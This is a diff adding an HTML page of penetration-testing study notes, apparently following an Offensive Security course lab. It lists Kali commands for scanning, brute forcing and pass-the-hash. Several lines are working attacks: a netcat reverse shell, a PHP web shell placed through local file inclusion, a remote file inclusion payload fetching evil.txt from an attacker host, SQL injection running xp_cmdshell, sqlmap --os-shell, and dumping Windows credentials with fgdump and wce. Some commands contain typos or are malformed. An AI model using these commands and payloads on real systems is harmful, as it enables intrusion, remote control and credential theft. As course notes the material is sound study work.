@@ -1,0 +1,398 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Tools</title>
+</head><body><span style="font-size: 15pt">SSH:</span><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">root@kali:~# systemctl start ssh</li>
+</ul>
+</li>
+<li style="list-style-type: none"></li>
+<li style="list-style-type: none">verify:</li>
+<li style="list-style-type: none"></li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">root@kali:~# &nbsp;netstat -antp | grep sshd</li>
+</ul>
+</li>
+<li style="list-style-type: none"></li>
+<li style="list-style-type: none">enable at start:</li>
+<li style="list-style-type: none"></li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">root@kali:~# systemctl enable ssh</li>
+<li style="list-style-type: none"></li>
+</ul>
+</li>
+<li style="list-style-type: none">ssh change port</li>
+<li style="list-style-type: none"></li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">root@kali:~# vim /etc/ssh/sshd_config</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">Port 601113</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<br/>
+<span style="font-size: 15pt">Netcat (page 50):</span><ul><li style="list-style-type: none">connect to machine:</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">root@kali:~# nc -nv 10.11.15.91 4444</li>
+</ul>
+</li>
+<li style="list-style-type: none">listen on current machine</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">root@kali:~# nc -nlvp 4444</li>
+</ul>
+</li>
+</ul>
+<br/>
+<br/>
+<br/>
+<span style="font-size: 15pt">Apache:</span><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">root@kali:~# systemctl start apache2</li>
+</ul>
+</li>
+</ul>
+<ul><li style="list-style-type: none">verify:</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none"></li>
+<li style="list-style-type: none">netstat -antp | grep apache</li>
+<li style="list-style-type: none"></li>
+</ul>
+</li>
+<li style="list-style-type: none">enable at start:</li>
+<li style="list-style-type: none"></li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">root@kali:~# systemctl enable apache</li>
+<li style="list-style-type: none"></li>
+</ul>
+</li>
+<li style="list-style-type: none"></li>
+<li style="list-style-type: none">File location: </li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">root@kali:/var/www/html# </li>
+</ul>
+</li>
+<li style="list-style-type: none"></li>
+<li style="list-style-type: none">Alternate start/stop/restart apache:</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">root@kali:~# service apache2 start</li>
+<li style="list-style-type: none">root@kali:~# service apache2 stop</li>
+<li style="list-style-type: none">root@kali:~# service apache2 restart</li>
+<li style="list-style-type: none"></li>
+</ul>
+</li>
+<li style="list-style-type: none"></li>
+</ul>
+<br/>
+<br/>
+<span style="font-size: 15pt">tftp (UDP ftp) (page 197):</span><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">root@kali:~# mkdir /tftp</li>
+<li style="list-style-type: none">root@kali:~# atftpd --daemon --port 69 /tftp</li>
+<li style="list-style-type: none">root@kali:~# cp /usr/share/windows-binaries/nc.exe /tftp/</li>
+<li style="list-style-type: none"></li>
+</ul>
+</li>
+</ul>
+<br/>
+<span style="font-size: 15pt">pureftp (page 199):</span><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">root@kali:~# apt-get update &amp;&amp; apt-get isntall pure-ftpd</li>
+<li style="list-style-type: none"></li>
+</ul>
+</li>
+<li style="list-style-type: none">to setup users use following script:</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">root@kali:~/gen# cat setup-ftp</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">#!/bin/bash</li>
+<li style="list-style-type: none"></li>
+<li style="list-style-type: none">groupadd ftpgroup</li>
+<li style="list-style-type: none">useradd -g ftpgroup -d /dev/null -s /etc ftpuser</li>
+<li style="list-style-type: none">pure-pw useradd offsec -u ftpuser -d /ftphome</li>
+<li style="list-style-type: none">pure-pw mkdb</li>
+<li style="list-style-type: none">cd /etc/pure-ftpd/auth/</li>
+<li style="list-style-type: none">ln -s ../conf/PureDB 60pdb</li>
+<li style="list-style-type: none">mkdir -p /ftphome</li>
+<li style="list-style-type: none">chown -R ftpuser:ftpgroup /ftphome/</li>
+<li style="list-style-type: none">/etc/init.d/pureftpd restart</li>
+<li style="list-style-type: none"></li>
+</ul>
+</li>
+<li style="list-style-type: none">root@kali:~# chmod 755 setup-ftp</li>
+<li style="list-style-type: none">root@kali:~# ./setup-ftp</li>
+<li style="list-style-type: none"></li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">You will need to enter a password during etup</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<ul><li style="list-style-type: none"><ul><li style="list-style-type: none">root@kali:/ftphome# ls</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">Everything.exe &nbsp;fgdump.exe &nbsp;nc.exe &nbsp;testfile.txt</li>
+<li style="list-style-type: none"></li>
+<li style="list-style-type: none"></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<span style="font-size: 15pt">Find stuff</span><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">root@kali:~# locate sdb.exe</li>
+<li style="list-style-type: none">root@kali:~# find /-name sbd*</li>
+<li style="list-style-type: none"></li>
+<li style="list-style-type: none"></li>
+<li style="list-style-type: none">C:\&gt;dir /b/s passwords*</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">C:\Users\Administrator\Desktop\passwords.txt</li>
+<li style="list-style-type: none">C:\xampp\passwords.txt</li>
+</ul>
+</li>
+<li style="list-style-type: none"></li>
+</ul>
+</li>
+</ul>
+<span style="font-size: 15pt">nmap:<br/>
+</span><ul><li style="list-style-type: none"><ul><span style="font-size: 10pt"><li style="list-style-type: none">nmap -sn 10.11.1.1-254</li>
+</span><li style="list-style-type: none"><span style="font-size: 10pt">nmap -sP 10.11.1.1.-254</span></li>
+</ul>
+</li>
+<li style="list-style-type: none"></li>
+<li style="list-style-type: none">banner grabbing:</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">nmap -sV sT 10.11.1.1</li>
+<li style="list-style-type: none">nmap -sV --script=banner 10.11.1.1</li>
+</ul>
+</li>
+<li style="list-style-type: none">nse script</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">nmap 10.11.1.1 --script smb-os-disovery.nse</li>
+<li style="list-style-type: none"></li>
+</ul>
+</li>
+<li style="list-style-type: none">NSE script location:</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">/usr/share/nmap/scripts</li>
+</ul>
+</li>
+<b><li style="list-style-type: none">Vulnerability scan</li>
+</b><li style="list-style-type: none"><b>root@kali</b>:<b>~/gen/nmap</b># nmap -sV --script vuln 10.11.1.31</li>
+<li style="list-style-type: none"><b>root@kali</b>:<b>~/gen/nmap</b># nmap --script ftp-brute -p 21 10.11.1.14</li>
+</ul>
+<br/>
+wget<br/>
+<br/>
+<b>tcpdump </b>(page 71): &nbsp;packet analyzer <ul><li style="list-style-type: none">patrick@payday:/root$ sudo tcpdump -qns 0 -A -r capture.cap </li>
+</ul>
+<br/>
+<b>Google hacking </b>(page 80): &nbsp;site:microsoftcom -site:www.microsoft.com<br/>
+&nbsp; &nbsp; &nbsp; Google Hcking Database<br/>
+<br/>
+<b>theharvester </b>(page 87): &nbsp;enumerate email addresses belonging to the orginzation<ul><li style="list-style-type: none">root@kali:~# theharvester -d cisco.com -b google &gt;google.txt</li>
+</ul>
+<br/>
+<b>whois </b>(page 90): &nbsp;Central registry Whois database<br/>
+&nbsp; &nbsp; &nbsp;&#09;root@kali:~# whois megacorpone.com<br/>
+<br/>
+<b>recon-ng </b>(page 93): &nbsp;web reconnaissance framework<br/>
+&nbsp; &nbsp; &#09;root@kali:~# recon-ng<br/>
+<br/>
+<b>host</b>&nbsp;(page 96): &nbsp;grab host information<br/>
+&nbsp; &nbsp; &#09;root@kali:~# host -t ns megacorpone.com<br/>
+&nbsp; &nbsp; &#09;root@kali:~# host -t mx megacorpone.com<br/>
+&nbsp; &nbsp; &#09;root@kali:~# host -l &lt;domain name&gt; &lt;dns server address&gt; &nbsp;Zone transfer<br/>
+<br/>
+<b>dnsrecon </b>(103): &nbsp;DNS enumeration<ul><li style="list-style-type: none">root@kali:~# dnsrecon -d megacorpone.com -t axfr</li>
+</ul>
+<br/>
+<b>dnsenum(</b>104): &nbsp;another dns enumeration<ul><li style="list-style-type: none">root@kali:~# dnsenum zontransfer.me &nbsp; &nbsp; &nbsp;</li>
+<li style="list-style-type: none"></li>
+</ul>
+<b>nc</b>: &nbsp;netcat = a tool to connect to tcp and udp ports<ul><li style="list-style-type: none">root@kali:~# nc -nlvp 444</li>
+<li style="list-style-type: none">root@kali:~# nc -nv 10.0.0.22 110</li>
+<li style="list-style-type: none">root@kali:~# nc -nv </li>
+<li style="list-style-type: none"></li>
+<li style="list-style-type: none">as a port scanner (108):</li>
+<li style="list-style-type: none">root@kali:~# nc -nvv -w 1 -z 10.0.0.19 3388-3390</li>
+<li style="list-style-type: none"></li>
+</ul>
+&nbsp; &nbsp; &nbsp; &nbsp;as a reverse shell:<ul><li style="list-style-type: none">nc -e /bin/sh 10.11.0.175 4444</li>
+<li style="list-style-type: none"></li>
+</ul>
+<b>netstat</b>: &nbsp;shows what is open on linux<ul><li style="list-style-type: none">oot@kali:~# netstat -lntp</li>
+</ul>
+<br/>
+<b>nmap</b>: &nbsp;network scanner (111)<br/>
+<br/>
+<b>dirbuster:</b>&nbsp; Web Application Brute Forcing<br/>
+<br/>
+<b>nbtscan </b>(121): &nbsp;tool for identifying NetBIOS information<ul><li style="list-style-type: none">root@kali:~# nbtscan -r 10.11.1.0/24</li>
+</ul>
+<br/>
+<b>enum4linux </b>(122): enumerating windows and linux samba systems<ul><li style="list-style-type: none">root@kali:~# enum4linux -a 10.11.1.227</li>
+<li style="list-style-type: none"></li>
+</ul>
+<b>onesixtyone</b>&nbsp;(132): &nbsp;check for snmp community strings for ip list<ul><li style="list-style-type: none">root@kali:~# &nbsp;onesixtyone -c community.txt -i ips.txt</li>
+</ul>
+<br/>
+<b>snmpwalk</b>&nbsp;(133): &nbsp; probe and query snmp values<ul><li style="list-style-type: none">root@kali:~# snmpwalk -c public -v1 10.11.1.219</li>
+</ul>
+<b>snmp-check</b><ul><li style="list-style-type: none">root@kali:~/gen/snmp# snmp-check 10.11.1.7</li>
+</ul>
+<br/>
+<b>OpenVAS</b>&nbsp;(139): &nbsp;open vulnerability assessement system<ul><li style="list-style-type: none">root@kali:~# &nbsp;apt-get install openvas</li>
+</ul>
+&#09;<b>root@kali</b>:<b>~/gen/openvas</b># openvasmd --user=admin --new-password=password3$ <ul><li style="list-style-type: none">https://127.0.0.1:9392</li>
+<li style="list-style-type: none">root@kali:~# </li>
+<li style="list-style-type: none">if no login then:</li>
+<li style="list-style-type: none">root@kali:~# openvasmd start </li>
+<li style="list-style-type: none"></li>
+<li style="list-style-type: none">If it doesn't work:</li>
+<li style="list-style-type: none"></li>
+<li style="list-style-type: none"><b>root@kali</b>:<b>~</b># openvas-check-setup </li>
+<li style="list-style-type: none">root@kali:~# openvasmd start </li>
+<li style="list-style-type: none">root@kali:~# openvasmd start </li>
+<li style="list-style-type: none">root@kali:~# openvassd start</li>
+<li style="list-style-type: none">root@kali:~# openvas-start</li>
+<li style="list-style-type: none"></li>
+</ul>
+<br/>
+<b>tftp </b>(197): &nbsp;UDP based file transfer<ul><li style="list-style-type: none">root@kali:~# mkdir /tftp</li>
+<li style="list-style-type: none">root@kali:~# atftpd --daemon --port 69 /tftp</li>
+<li style="list-style-type: none">root@kali:~# cp /user/share/files/nce.exe /tftp</li>
+<li style="list-style-type: none">c:\tftp -i 10.11.0.175 get nc.exe</li>
+<li style="list-style-type: none"></li>
+<li style="list-style-type: none"></li>
+</ul>
+<b>PureFTP </b>(199): &nbsp;ftp server on kali<ul><li style="list-style-type: none">root@kali:~# mkdir /ftphome</li>
+<li style="list-style-type: none">root@kali:~# chown -R ftpuser:ftpgroup /ftphome/</li>
+<li style="list-style-type: none">root@kali:~# /etc/init.d/pure-ftpd restart</li>
+<li style="list-style-type: none"></li>
+</ul>
+<br/>
+**************** more work on this *********************<br/>
+<b>debug.exe</b>&nbsp;(202): &nbsp;acts as an assembler, disassembler, and a hex dumpint tool<br/>
+<b>upx</b>&nbsp;(203): &nbsp;optimizes the file size (shrinks it)<br/>
+<b>exe2bat </b>(203): &nbsp;converts from txt back to executable<br/>
+<br/>
+<b>pyinstaller </b>(209): &nbsp;create stand-alone windows executable from python script<ul><li style="list-style-type: none">c:\users\offsec\desktop\pyinstaller-2.0\python pyinstaller.py -onefile ms11-00.py</li>
+<li style="list-style-type: none"></li>
+</ul>
+<b>icacles</b>&nbsp;(212): &nbsp;shows permissions on windows files<ul><li style="list-style-type: none">c:\icacles filename.exe</li>
+</ul>
+<br/>
+<b>msvenom </b>(220): &nbsp;payload generator for metasploit<br/>
+<br/>
+<b>cookies Manager:</b>&nbsp; firefox addon<br/>
+<b>tamper data:</b>&nbsp; firefox addon<br/>
+<br/>
+<br/>
+<b>Cross Site Scripting:</b>&nbsp; unsanitized user input<ul><li style="list-style-type: none">iframe insertion: &nbsp;inserted into the unsanitized input to redirect a victim's browser &nbsp;(may be able to steal cookies from users, then used by bad guy to steal sessions)</li>
+</ul>
+<br/>
+<b>LFI:</b>&nbsp; Local file inclusion:<ul><li style="list-style-type: none">http://blah.com/**Lang=.<b><u>./../../../../../../</u></b>windows/system32/drivers/hosts<u><b>%00</b></u></li>
+<li style="list-style-type: none"></li>
+<li style="list-style-type: none">insert code into a local file on the filesystem through nc.exe (page 240), then execute with LFI</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">" &lt;?php echo shell_exec($_GET['cmd'];?&gt;"</li>
+<li style="list-style-type: none"></li>
+<li style="list-style-type: none"></li>
+</ul>
+</li>
+</ul>
+<b>RFI: </b>&nbsp;Remote file inclusion:<ul><li style="list-style-type: none">http://blah.com/**Lang=http://10.11.0.5/evil.txt%00</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">/var/www/html/evil.txt = &nbsp;&lt;?php echo shell_exec("ipconfig");?&gt;</li>
+</ul>
+</li>
+</ul>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+<b>SQl injection </b>(page 245):<br/>
+<ul><li style="list-style-type: none">to test: &nbsp;'or 1=1--</li>
+<li style="list-style-type: none">to run cmd = '; exec master..xp_cmdshell 'ping 10.11.0.175'-- &nbsp; &nbsp;(test by runing an monitoring with wireshark)</li>
+<li style="list-style-type: none"></li>
+<li style="list-style-type: none"></li>
+</ul>
+<b>sqlmap</b>&nbsp;(260): &nbsp;identify and exploit sql injection vulnerabilties<ul><li style="list-style-type: none">root@kali:~# sqlmap -u http://10.11.1.35 &nbsp;--crawl=1</li>
+<li style="list-style-type: none">root@kali:~# sqlmap -u http://10.11.1.35/comment.php?id=738 --dbms=mysql --dump --threads=5</li>
+<li style="list-style-type: none">root@kali:~# sqlmap -u http://10.11.1.35/comment.php?id=738 --dbms=mysql --os-shell</li>
+<li style="list-style-type: none"></li>
+</ul>
+<br/>
+<b>crunch</b>&nbsp;(266): &nbsp;generate custom wordlists<br/>
+<br/>
+<br/>
+<b>fgdump.exe </b>(269): &nbsp;in-memory attack of lsass process, to dump hashes from windows<br/>
+<ul><li style="list-style-type: none">c:\fgdump.exe</li>
+<li style="list-style-type: none">c:\type 127.0.0.1.pwdump</li>
+<li style="list-style-type: none"></li>
+</ul>
+<b>wce.exe (</b>270): &nbsp;can cump ntlm creds from memory, and clear text passwords stored by windows<ul><li style="list-style-type: none">c:\wce.exe -w</li>
+<li style="list-style-type: none"></li>
+</ul>
+<b>cewl</b>&nbsp;(272): &nbsp;tool will scrape website for passwords<ul><li style="list-style-type: none">root@kali:~# cewl megacorpone.com -m 6 -w megacorp-cewl.txt</li>
+<li style="list-style-type: none"></li>
+</ul>
+<b>john</b>&nbsp;(273): &nbsp;john the ripper can mutate words found with cewl<ul><li style="list-style-type: none">root@kali:~# john --wordlist=megacorp-cewl.txt --rules --stdout &gt; mutated.txt</li>
+</ul>
+<br/>
+<b>medusa </b>(276): &nbsp;login brute forcer<ul><li style="list-style-type: none">root@kali:~# medusa -h 10.11.1.219 -u admin -P password_file.txt -M http -m DIR:/admin -T 10</li>
+<li style="list-style-type: none">root@kali:~# medusa -h admin.megacorpone.com -u admin -P mega-mangled -M http -n 81 -m DIR:/admin -T 30</li>
+<li style="list-style-type: none">root@kali:~/gen/password#<b>&nbsp;</b>medusa -u root -P johnpassword.txt -h 10.11.1.44 -M ssh </li>
+<li style="list-style-type: none">root@kali:~/gen/misc# while read -r a b; do medusa -u $a -p $b -h 10.11.1.44 -M ssh ; done &lt; usernamepassword.txt</li>
+<li style="list-style-type: none">&nbsp; &nbsp; &nbsp; format must be in "username password"</li>
+<li style="list-style-type: none"></li>
+</ul>
+<b>ncrack </b>(277): &nbsp;network auth cracking tool, can do RDP<ul><li style="list-style-type: none">root@kali:~# ncrack -vv --user offsec -P password_file.txt rdp://10.11.1.35</li>
+<li style="list-style-type: none"></li>
+</ul>
+<b>hydra (</b>277): network auth cracking tool, can do snmp<ul><li style="list-style-type: none">root@kali:~# hydra -P password_file.txt -v 10.11.1.219 snmp</li>
+<li style="list-style-type: none">root@kali:~/gen/password# hydra -t 1 -l ftp -P johnpassword.txt ftp://10.11.1.22</li>
+<li style="list-style-type: none"></li>
+<li style="list-style-type: none"><b>root@kali</b>:<b>~/gen/password</b># for ips in $(cat active-ips); do hydra -t 1 -V -f -L usersdumped -P passworddumped rdp://$ips; done </li>
+<li style="list-style-type: none"></li>
+</ul>
+<b>hash-identifier </b>(281): used to identify password hashes<ul><li style="list-style-type: none">root@kali:~# hash-identifier</li>
+</ul>
+<br/>
+<b>john</b>&nbsp;(283): &nbsp;tool for cracking passwords<ul><li style="list-style-type: none">root@kali:~# john 127.0.0.1.pwdump</li>
+<li style="list-style-type: none">root@kali:~# john --wordlist=/usr/share/wordlists/rockyou.txt 127.0.0.1.pwdump</li>
+<li style="list-style-type: none">root@kali:~# john --rules --wordlist/user/share/wordlists/rockyou.txt 127.0.0.1.pwdump</li>
+</ul>
+<br/>
+<b>unshadow </b>(283): &nbsp;tool to unshadow linux hashes with the passwd and shadow files<ul><li style="list-style-type: none">root@kali:~# unshadow passwd-file.txt shadow-file.txt</li>
+<li style="list-style-type: none"></li>
+</ul>
+<b>pth-winexe</b>&nbsp;(287): &nbsp;tool to authenticate with stolen password hash<ul><li style="list-style-type: none">root@kali:~# export SMBHASH=ahafhaosihdalskdhalkhlaskhf:asdlhfalsdkhfafhulkhafhelahflwu</li>
+<li style="list-style-type: none">root@kali:~# pth-winexe -U administrator% //10.11.01.76 cmd</li>
+<b><li style="list-style-type: none"></li>
+</b></ul>
+<b>rinetd </b>(288): &nbsp;simple port forwarding/redirection<ul><li style="list-style-type: none">root@kali:~# cat /etc/rinetd.conf</li>
+<li style="list-style-type: none"></li>
+</ul>
+<b>SSH tunneling:</b>&nbsp; tunnel traffic through ssh tunnel, also reverse tunnel traffic<ul><li style="list-style-type: none">root@kali:~# ssh -R *:19999:192.168.1.42:60113 129.244.12.209 -p 60113 -l root</li>
+<li style="list-style-type: none">root@kali:~# ssh -D 20000 -p 19999 localhost -l root</li>
+<li style="list-style-type: none"></li>
+</ul>
+<b>proxychains:</b>&nbsp; will act as a SOCKS server through a tunnel (slow)<ul><li style="list-style-type: none">oot@kali:~# proxychains nmap --top-ports=20 sT -Pn 172.16.40.0.24</li>
+<li style="list-style-type: none"></li>
+</ul>
+<br/>
+<b>MSf </b>(302): &nbsp;Metasploit Framework<br/>
+<br/>
+<b>Regedit:</b><ul><li style="list-style-type: none">dump whole registry to file: &nbsp;</li>
+<li style="list-style-type: none">C:\&gt;regedit -e regtest.txt</li>
+<li style="list-style-type: none"></li>
+<li style="list-style-type: none"></li>
+</ul>
+<br/>
+<b>curl:</b>&nbsp; check headers from the webserver<ul><li style="list-style-type: none">root@kali:~/gen/curl# curl -i 10.11.1.71</li>
+<li style="list-style-type: none"></li>
+</ul>
+<br/>
+<b>gobuster: </b>&nbsp;website directory brute force<br/>
+<b>&nbsp; &nbsp; &nbsp; root@kali</b>:<b>~/gen/curl</b># gobuster -u http://10.11.1.71/ -w /usr/share/seclists/Discovery/Web_Content/common.txt -s 200,204,301,302,307,403,500 -e <br/>
+<br/>
+<br/>
+nikto: &nbsp;<ul><li style="list-style-type: none"><b>root@kali</b>:<b>~/gen/curl</b># nikto -host 10.11.1.71 </li>
+<li style="list-style-type: none"></li>
+<li style="list-style-type: none"></li>
+</ul>
+Netstat:<ul><li style="list-style-type: none">netstat -antup </li>
+</ul>
+<br/>
+SMBClinet<ul><li style="list-style-type: none">root@kali:~/gen/nmap# smbclient -L 10.11.1.31</li>
+<li style="list-style-type: none"><b>root@kali</b>:<b>~/gen/nmap</b># smbclient \\\\10.11.1.31\\wwwroot </li>
+</ul>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+end<br/>
+</body></html>
